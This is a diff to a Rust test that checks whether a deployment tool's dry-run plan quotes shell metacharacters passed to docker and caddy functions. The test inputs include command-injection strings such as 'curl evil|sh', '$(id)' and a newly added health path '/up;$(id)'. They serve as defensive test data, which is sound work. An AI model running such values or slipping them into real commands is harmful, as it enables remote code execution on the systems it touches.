@@ -186,7 +186,7 @@ fn docker_run_and_proxy_deploy_quote_metacharacters_in_the_plan() {
         r#"import "std/docker" as docker;
         import "std/caddy" as caddy;
         docker::docker_run("web1", "app:v1;curl evil|sh", "n$(id)", #{});
-        caddy::proxy_deploy("web1", "svc'x;id", "10.0.0.1:3000", #{ domain: "a.example.com" });"#,
+        caddy::proxy_deploy("web1", "svc'x;id", "10.0.0.1:3000", #{ domain: "a.example.com", health_path: "/up;$(id)" });"#,
     );
     assert!(ok, "dry-run failed: {err}");
     assert!(
@@ -197,5 +197,9 @@ fn docker_run_and_proxy_deploy_quote_metacharacters_in_the_plan() {
     assert!(
         out.contains(r#"svc'\''x;id"#),
         "caddy service not quoted: {out}"
+    );
+    assert!(
+        out.contains(r#""uri":"/up;$(id)""#),
+        "caddy health path not carried as a JSON string: {out}"
     );
 }
